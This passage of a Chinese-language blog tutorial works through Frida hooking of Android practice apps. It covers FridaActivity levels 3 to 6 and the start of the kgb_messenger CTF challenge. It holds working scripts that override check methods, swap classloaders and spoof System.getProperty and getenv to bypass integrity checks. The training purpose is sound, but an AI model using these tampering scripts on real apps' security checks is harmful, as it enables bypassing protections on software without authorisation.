class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class FridaActivity3 extends BaseFridaActivity &#123;</span><br><span class="line">    private static boolean static_bool_var &#x3D; false;</span><br><span class="line">    private boolean bool_var &#x3D; false;</span><br><span class="line">    private boolean same_name_bool_var &#x3D; false;</span><br><span class="line"></span><br><span class="line">    public String getNextCheckTitle() &#123;</span><br><span class="line">        return &quot;当前第3关&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void same_name_bool_var() &#123;</span><br><span class="line">        Log.d(&quot;Frida&quot;, static_bool_var + &quot; &quot; + this.bool_var + &quot; &quot; + this.same_name_bool_var);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onCheck() &#123;</span><br><span class="line">        if (!static_bool_var || !this.bool_var || !this.same_name_bool_var) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(new Intent(this, FridaActivity4.class));</span><br><span class="line">        finishActivity(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键还是让<code>if (!static_bool_var || !this.bool_var || !this.same_name_bool_var)</code>为false，则三个变量都要为true</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        <span class="keyword">var</span> FridaActivity3 = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity3"</span>)</span><br><span class="line">        FridaActivity3.static_bool_var.value = <span class="literal">true</span></span><br><span class="line">        </span><br><span class="line">        Java.choose(<span class="string">"com.example.androiddemo.Activity.FridaActivity3"</span>, &#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                instance.bool_var.value = <span class="literal">true</span></span><br><span class="line">                instance._same_name_bool_var.value = <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意类里有一个成员函数和成员变量都叫做<code>same_name_bool_var</code>，这种时候在成员变量前加一个<code>_</code>，修改值的形式为<code>xx.value = yy</code></p><h3 id="Frida-hook-内部类，枚举类的函数并hook，trace原型1"><a href="#Frida-hook-内部类，枚举类的函数并hook，trace原型1" class="headerlink" title="Frida hook : 内部类，枚举类的函数并hook，trace原型1"></a>Frida hook : 内部类，枚举类的函数并hook，trace原型1</h3><p>总结:</p><ul><li>对于内部类，通过<code>类名$内部类名</code>去use或者choose</li><li>对use得到的clazz应用反射，如<code>clazz.class.getDeclaredMethods()</code>可以得到类里面声明的所有方法，即可以枚举类里面的所有函数。</li></ul><p>接下来是第四关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class FridaActivity4 extends BaseFridaActivity &#123;</span><br><span class="line">    public String getNextCheckTitle() &#123;</span><br><span class="line">        return &quot;当前第4关&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class InnerClasses &#123;</span><br><span class="line">        public static boolean check1() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check2() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check3() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check4() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check5() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static boolean check6() &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private InnerClasses() &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onCheck() &#123;</span><br><span class="line">        if (!InnerClasses.check1() || !InnerClasses.check2() || !InnerClasses.check3() || !InnerClasses.check4() || !InnerClasses.check5() || !InnerClasses.check6()) &#123;</span><br><span class="line">            super.CheckFailed();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(new Intent(this, FridaActivity5.class));</span><br><span class="line">        finishActivity(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关的关键是让<code>if (!InnerClasses.check1() || !InnerClasses.check2() || !InnerClasses.check3() || !InnerClasses.check4() || !InnerClasses.check5() || !InnerClasses.check6())</code>中的所有check全部返回true。</p><p>其实这里唯一的问题就是寻找内部类<code>InnerClasses</code>，对于内部类的hook，通过<code>类名$内部类名</code>去use。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch4</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> InnerClasses = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity4$InnerClasses"</span>)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        InnerClasses.check1.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check2.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check3.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check4.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check5.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        InnerClasses.check6.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用反射，获取类中的所有method声明，然后字符串拼接去获取到方法名，例如下面的check1，然后就可以批量hook，而不用像我上面那样一个一个写。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inner_classes = Java.use(<span class="string">"com.example.androiddemo.Activity.FridaActivity4$InnerClasses"</span>)</span><br><span class="line"><span class="keyword">var</span> all_methods = inner_classes.class.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check1(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check2(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check3(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check4(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check5(),public <span class="keyword">static</span> boolean com.example.androiddemo.Activity.FridaActivity4$InnerClasses.check6()</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-hook动态加载的dex，与查找interface，"><a href="#Frida-hook-hook动态加载的dex，与查找interface，" class="headerlink" title="Frida hook : hook动态加载的dex，与查找interface，"></a>Frida hook : hook动态加载的dex，与查找interface，</h3><p>总结:</p><ul><li>通过<code>enumerateClassLoaders</code>来枚举加载进内存的classloader，再<code>loader.findClass(xxx)</code>寻找是否包括我们想要的interface的实现类，最后通过<code>Java.classFactory.loader = loader</code>来切换classloader，从而加载该实现类。</li></ul><p>第五关比较有趣，它的check函数是动态加载进来的。<br>java里有interface的概念，是指一系列抽象的接口，需要类来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.androiddemo.Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CheckInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicCheck</span> <span class="keyword">implements</span> <span class="title">CheckInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity5</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> CheckInterface DynamicDexCheck = <span class="keyword">null</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CheckInterface <span class="title">getDynamicDexCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.DynamicDexCheck == <span class="keyword">null</span>) &#123;</span><br><span class="line">            loaddex();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.DynamicDexCheck;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        loaddex();</span><br><span class="line">        <span class="comment">//this.DynamicDexCheck = (CheckInterface) new DexClassLoader(str, filesDir.getAbsolutePath(), (String) null, getClassLoader()).loadClass("com.example.androiddemo.Dynamic.DynamicCheck").newInstance();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getDynamicDexCheck() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">"onClick loaddex Failed!"</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getDynamicDexCheck().check()) &#123;</span><br><span class="line">            CheckSuccess();</span><br><span class="line">            startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity6<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">            finishActivity(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个loaddex其实就是先从资源文件加载classloader到内存里，再loadClass DynamicCheck，创建出一个实例，最终调用这个实例的check。<br>所以现在我们就要先枚举class loader，找到能实例化我们要的class的那个class loader，然后把它设置成Java的默认class factory的loader。<br>现在就可以用这个class loader来使用<code>.use</code>去import一个给定的类。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch5</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Java.choose("com.example.androiddemo.Activity.FridaActivity5",&#123;</span></span><br><span class="line">        <span class="comment">//     onMatch:function(x)&#123;</span></span><br><span class="line">        <span class="comment">//         console.log(x.getDynamicDexCheck().$className)</span></span><br><span class="line">        <span class="comment">//     &#125;,onComplete:function()&#123;&#125;</span></span><br><span class="line">        <span class="comment">// &#125;)</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"start"</span>)</span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">loader</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.findClass(<span class="string">"com.example.androiddemo.Dynamic.DynamicCheck"</span>))&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">"Successfully found loader"</span>)</span><br><span class="line">                        <span class="built_in">console</span>.log(loader);</span><br><span class="line">                        Java.classFactory.loader = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"find error:"</span> + error)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end1"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        Java.use(<span class="string">"com.example.androiddemo.Dynamic.DynamicCheck"</span>).check.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"end2"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(ch5)</span><br></pre></td></tr></table></figure><p>todo有一个疑问<br><a href="https://github.com/frida/frida/issues/1049" target="_blank" rel="noopener">https://github.com/frida/frida/issues/1049</a></p><h3 id="Frida-hook-枚举class，trace原型2"><a href="#Frida-hook-枚举class，trace原型2" class="headerlink" title="Frida hook : 枚举class，trace原型2"></a>Frida hook : 枚举class，trace原型2</h3><p>总结: 通过<code>Java.enumerateLoadedClasses</code>来枚举类，然后<code>name.indexOf(str)</code>过滤一下并hook。</p><p>接下来是第六关</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class0;</span><br><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class1;</span><br><span class="line"><span class="keyword">import</span> com.example.androiddemo.Activity.Frida6.Frida6Class2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FridaActivity6</span> <span class="keyword">extends</span> <span class="title">BaseFridaActivity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNextCheckTitle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"当前第6关"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!Frida6Class0.check() || !Frida6Class1.check() || !Frida6Class2.check()) &#123;</span><br><span class="line">            <span class="keyword">super</span>.CheckFailed();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        CheckSuccess();</span><br><span class="line">        startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, FridaActivity7<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        finishActivity(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关是import了一些类，然后调用类里的静态方法，所以我们枚举所有的类，然后过滤一下，并把过滤出来的结果hook上，改掉其返回值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ch6</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">name, handle</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (name.indexOf(<span class="string">"com.example.androiddemo.Activity.Frida6"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"name:"</span> + name + <span class="string">" handle:"</span> + handle)</span><br><span class="line">                    Java.use(name).check.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-搜索interface的具体实现类"><a href="#Frida-hook-搜索interface的具体实现类" class="headerlink" title="Frida hook : 搜索interface的具体实现类"></a>Frida hook : 搜索interface的具体实现类</h3><p>利用反射得到类里面实现的interface数组，并打印出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">class_name</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (class_name.indexOf(<span class="string">"com.example.androiddemo"</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> hook_cls = Java.use(class_name)</span><br><span class="line">                    <span class="keyword">var</span> interfaces = hook_cls.class.getInterfaces()</span><br><span class="line">                    <span class="keyword">if</span> (interfaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(class_name + <span class="string">": "</span>)</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> interfaces) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">"\t"</span>, interfaces[i].toString())</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"end"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-hook基础（二"><a href="#Frida-hook基础（二" class="headerlink" title="Frida hook基础（二)"></a>Frida hook基础（二)</h2><ul><li>spawn/attach</li><li>各种主动调用</li><li>hook函数和hook构造函数</li><li>调用栈/简单脚本</li><li>动态加载自己的dex</li></ul><p>题目下载地址:<br><a href="https://github.com/tlamb96/kgb_messenger" target="_blank" rel="noopener">https://github.com/tlamb96/kgb_messenger</a></p><h3 id="spawn-attach"><a href="#spawn-attach" class="headerlink" title="spawn/attach"></a>spawn/attach</h3><p>firda的-f参数代表span启动<br><code>frida -U -f com.tlamb96.spetsnazmessenger -l frida_russian.js --no-pause</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        String property = System.getProperty(<span class="string">"user.home"</span>);</span><br><span class="line">        String str = System.getenv(<span class="string">"USER"</span>);</span><br><span class="line">        <span class="keyword">if</span> (property == <span class="keyword">null</span> || property.isEmpty() || !property.equals(<span class="string">"Russia"</span>)) &#123;</span><br><span class="line">            a(<span class="string">"Integrity Error"</span>, <span class="string">"This app can only run on Russian devices."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (str == <span class="keyword">null</span> || str.isEmpty() || !str.equals(getResources().getString(R.string.User))) &#123;</span><br><span class="line">            a(<span class="string">"Integrity Error"</span>, <span class="string">"Must be on the user whitelist."</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a.a(<span class="keyword">this</span>);</span><br><span class="line">            startActivity(<span class="keyword">new</span> Intent(<span class="keyword">this</span>, LoginActivity<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目比较简单，但是因为这个check是在<code>onCreate</code>里，所以app刚启动就自动检查，所以这里需要用spawn的方式去启动frida脚本hook，而不是attach。<br>这里有两个检查，一个是检查property的值，一个是检查str的值。<br>分别从<code>System.getProperty</code>和<code>System.getenv</code>里获取，hook住这两个函数就行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-06-29-092212.png" alt=""><br>这里要注意从资源文件里找到<code>User</code>的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.use(<span class="string">"java.lang.System"</span>).getProperty.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Russia"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Java.use(<span class="string">"java.lang.System"</span>).getenv.overload(<span class="string">'java.lang.String'</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"RkxBR3s1N0VSTDFOR180UkNIM1J9Cg=="</span>;</span><br><span class="line">        